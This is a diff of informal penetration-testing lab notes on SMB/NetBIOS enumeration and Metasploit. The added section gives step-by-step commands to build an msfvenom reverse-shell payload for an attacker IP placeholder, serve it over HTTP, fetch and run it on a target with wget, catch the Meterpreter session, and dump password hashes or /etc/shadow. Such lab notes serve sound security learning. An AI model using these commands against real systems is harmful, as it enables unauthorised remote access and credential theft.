@@ -8,3 +8,19 @@ auxiliary(scanner/smb/smb_version) > run
 NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers. The NetBIOS name of the target system can give you an idea about its role and even importance
 (e.g. CORP-DC, DEVOPS, SALES, etc.). 
 You may also run across some shared files and folders that could be accessed either without a password or protected with a simple password (e.g. admin, administrator, root, toor, etc.).
+
+Msfvenom for the custom payloads
+1. Create the payload, setting lhost and lport (standart is 7777, but it can be taken so 4444 or ay other should work well) Ex:. msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<YOUR_ATTACKBOX_IP> LPORT=4444 -f elf > shell.elf
+
+2. Give full acccess to payload file
+3. Run python3 -m http.server 9000 to transfer the file to the target machine, leave the tab open
+4. In the second tab, msfconsole -> use exploit/multi/handler -> set payload linux/x86/meterpreter/reverse_tcp, lhost <YOU_ATTACKBOX_IP> and lport 4444 (the same as during the payload file creation)
+Note: fuser -k port/tcp to stop (kill) the processes
+5. type run
+
+6. In tab 3, ssh the target machine. Make sure the root permissions
+7. wget http://<YOUR_ATTACKBOX_IP>:port/payload_file
+NOTE: file can be placedin cd /tmp
+8. Execute the payload ./payload_file
+9. In tab2, meterpreter will be opened, depends on OS, use either hashdump or cat /etc/shadow
+ For linux, put the session to background, switch to /post/linux/gather/hashdump with setting the session as mandatory argument
